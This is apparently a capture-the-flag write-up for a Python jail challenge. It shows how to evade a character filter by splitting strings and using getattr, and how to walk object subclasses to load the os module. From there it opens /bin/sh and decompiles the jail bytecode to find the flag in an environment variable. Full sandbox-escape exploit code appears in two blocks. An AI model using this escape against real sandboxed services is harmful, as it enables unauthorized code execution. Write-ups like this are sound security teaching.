# Hell of a Jail

### TL;DR
- Circumvent the input filter
- Retreive the source code using deep python object inspection
- Reverse the source and find the flag

### Input filter

Try to type few commands and you will seen soon that you're limited to 14 input characters, but we can assign variables.

Obviously, there's an input filter taking out characters like `__` `.` and `"` but we can use the filtering order to circumvent the filter.

Let's try to combine characters like `_._` and we get `__`. For `.` filtering, we can use python builtin `getattr(object, "attribute")` which is equivalent to `object.attribute`.

Now we can start making an exploit...

### Exploiting

In every python jail, you want to access subclasses of base object. Let's do this localy first, open your favorite python interpreter and type :

`().__class__.__base__.__subclasses__()`

You get an array of subclasses. But now we want to try on the jail acknowledging the filter which gives something like that.

```python
a=()
b='_._class'
b+='_._'
a=getattr(a,b)
b='_._base_._'
a=getattr(a,b)
b='_._subclas'
b+='ses_._'
a=getattr(a,b)
a=a()
```

Have you noticed `<class '_frozen_importlib.BuiltinImporter'>` at index 80. Let's try to import a module like `os`.

Go back to your local shell and try :

`().__class__.__base__.__subclasses__()[80].load_module('os')`

Which gives us `<module 'os' (built-in)>`

So now we can import `os` module. We can get a shell with `os.system('/bin/sh')` and find the source code.


### Full shell exploit example

```python
a=()
b='_._class'
b+='_._'
a=getattr(a,b)
b='_._base_._'
a=getattr(a,b)
b='_._subclas'
b+='ses_._'
a=getattr(a,b)
a=a()[80]
b='load'
b+='_module'
a=getattr(a,b)
o=a('os')
b='system'
c='/bin/sh'
s=getattr(o,b)
s(c)
```

### The flag

Ok, we now have a shell but where's the flag ? The PyJail is actualy python3.7 bytecode. Let's have a look at it :
- First, we retreive it throw the console with : `base64 jail.pyc` as bytecode contains special characters.
- We use something like `uncompile6` to make it human readable.
- We find out that the flag was in fact inside an environment variable `0f4d0db3668dd58cabb9eb409657eaa8`. We use `env` inside the shell and we get it.
